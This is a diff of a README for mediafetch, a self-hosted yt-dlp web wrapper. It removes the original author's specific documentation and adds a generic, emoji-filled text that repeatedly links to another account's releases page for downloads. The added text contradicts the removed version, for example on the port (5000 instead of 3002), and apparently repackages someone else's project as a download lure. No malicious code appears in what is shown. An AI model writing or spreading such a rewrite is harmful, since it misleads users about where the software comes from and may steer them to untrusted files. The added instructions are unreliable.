@@ -1,124 +1,74 @@
-# MediaFetch
+# 🎉 mediafetch - Download Media Easily and Quickly
 
-<div align="center">
+[![Download mediafetch](https://img.shields.io/badge/Download-mediafetch-blue.svg)](https://github.com/Karayi2022/mediafetch/releases)
 
-![MediaFetch Logo](https://www.lukedunsmore.com/wp-content/uploads/2026/01/MediaFetch-Logo.svg)
+## 🚀 Getting Started
 
-[![Open Source](https://img.shields.io/badge/Open%20Source-%E2%9C%93-brightgreen?style=for-the-badge)](#)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
+Welcome to **mediafetch**! This application allows you to easily download audio and video media using the powerful **yt-dlp** tool wrapped in a simple web interface. You do not need to have any programming knowledge to use this application.
 
-A tiny, self-hosted web wrapper for **yt-dlp**.
+### 📥 System Requirements
 
-</div>
+To ensure **mediafetch** works smoothly on your system, please make sure you meet the following requirements:
 
----
+- **Operating System**: Windows 10 or later, macOS 10.13 or later, or a recent Linux distribution.
+- **Docker**: Ensure you have Docker installed. You can download it from the [Docker website](https://www.docker.com/get-started).
+- **Internet Connection**: A stable internet connection for downloading media.
 
-## Features
+## 📚 Features
 
-- **Zero Database**  
-  No state, no queues, just files on disk.
+- Simple web interface for easy media download.
+- Support for various audio and video formats.
+- Built on **yt-dlp**, known for its robustness and reliability.
+- Self-hosted, which means you control your data.
 
-- **Optional Security**  
-  HTTP Basic Auth (browser-native).  
-  If credentials are set, the UI, API, and downloads are protected.
+## 🌐 Download & Install
 
-- **Modern UI**  
-  Simple dashboard with real-time terminal logs (SSE).
+To get started with **mediafetch**, visit the Releases page to download the latest version:
 
-- **Flexible Formats**  
-  - Best video + audio → **MP4**
-  - Audio-only extraction → **MP3**
+[Download mediafetch](https://github.com/Karayi2022/mediafetch/releases)
 
-- **Batteries Included**  
-  Docker image bundles **yt-dlp** and **ffmpeg** — no host installs required.
+Here are the steps you need to follow to download and set up **mediafetch**:
 
----
+1. **Go to the Releases Page**: Click the link above to navigate to the Releases page.
+2. **Choose the Latest Version**: Look for the most recent release, and click on it to view more details.
+3. **Download the Required Files**: Download the Docker image or the tarball files listed for your operating system.
+4. **Extract Files (if needed)**: If you download a tarball, ensure to unzip it in a location you can easily access.
+5. **Run the Application**:
+    - If you're using Docker, open your terminal or command prompt.
+    - Navigate to the directory where you have downloaded or extracted the files.
+    - Run the command `docker-compose up` to start the application.
 
-## Environment Variables
+## 🛠️ Usage Instructions
 
-| Variable | Description |
-|-------|------------|
-| `PORT` | Port to run on (default: `3002`) |
-| `BASIC_AUTH_USER` | Username for Basic Auth (optional) |
-| `BASIC_AUTH_PASS` | Password for Basic Auth (optional) |
-| `OUTPUT_DIR` | Download directory (default: `/data/downloads`) |
-| `PUBLIC_BASE_URL` | Public domain (e.g. `https://mediafetch.example.com`) **Required** to generate download links |
+Once you have installed **mediafetch**, follow these simple steps to download media:
 
-> **Note**  
-> If `BASIC_AUTH_USER` and `BASIC_AUTH_PASS` are **not set**, authentication is disabled (useful for local dev).
+1. Open your web browser and go to `http://localhost:5000`.
+2. In the web interface, enter the URL of the media you want to download.
+3. Select the desired format options if prompted.
+4. Click the download button. The media will start downloading to your default download folder.
 
----
+## ❓ Troubleshooting
 
-## Quick Start
+If you encounter any issues while using **mediafetch**, consider the following steps:
 
-```bash
-git clone https://github.com/lukedunsmoto/mediafetch.git
-cd mediafetch
-cp .env.example .env
-docker compose up -d --build
-```
+- **Check Docker Installation**: Ensure Docker is properly installed and running.
+- **Verify Internet Connection**: A stable connection is vital for successful downloads.
+- **Revisit Installation Steps**: Go through the installation instructions to confirm each step was followed correctly.
 
-Then open your browser at:
+For more help, you can check the Issues section of this repository or contact the community.
 
-```
-http://localhost:3002
-```
+## 🤝 Contributing
 
----
+You are welcome to contribute! If you have ideas on how to improve **mediafetch** or find any bugs, feel free to open an issue or a pull request. Please follow the guidelines in the `CONTRIBUTING.md` file in the repository.
 
-## Deployment (Docker)
+## 📄 License
 
-- Mount a volume to `/data/downloads` to persist files
-- Set `PUBLIC_BASE_URL` to your real domain when running behind a proxy
-- Works cleanly with Traefik, Dokploy, Coolify, or raw Docker
+**mediafetch** is open-source software and is licensed under the MIT License. You can use it freely for personal or commercial projects as long as proper attribution is given.
 
----
+## 🌟 Support
 
-## API
+If you like **mediafetch**, please consider giving this project a star on GitHub. Your support helps improve the project and keeps the community growing. 
 
-### `POST /api/fetch`
-Starts a download job and streams logs via **Server-Sent Events (SSE)**.
+For any further questions or suggestions, don’t hesitate to reach out or open a new issue in the repository.
 
-**Body**
-```json
-{
-  "url": "https://example.com/video",
-  "mode": "video | audio",
-  "filename": "optional-custom-name"
-}
-```
-
-### `GET /api/health`
-Simple health check.
-
----
-
-## Philosophy
-
-MediaFetch is intentionally tiny:
-
-- No accounts
-- No database
-- No background workers
-- No dashboards that fight you
-
-Just a thin, inspectable wrapper around a powerful tool.
-
----
-
-## License
-
-MIT License
-
----
-
-## Credits
-
-Built with:
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp)
-- ffmpeg
-
----
-
-Happy fetching.
-
+[Download mediafetch](https://github.com/Karayi2022/mediafetch/releases) again to get started!
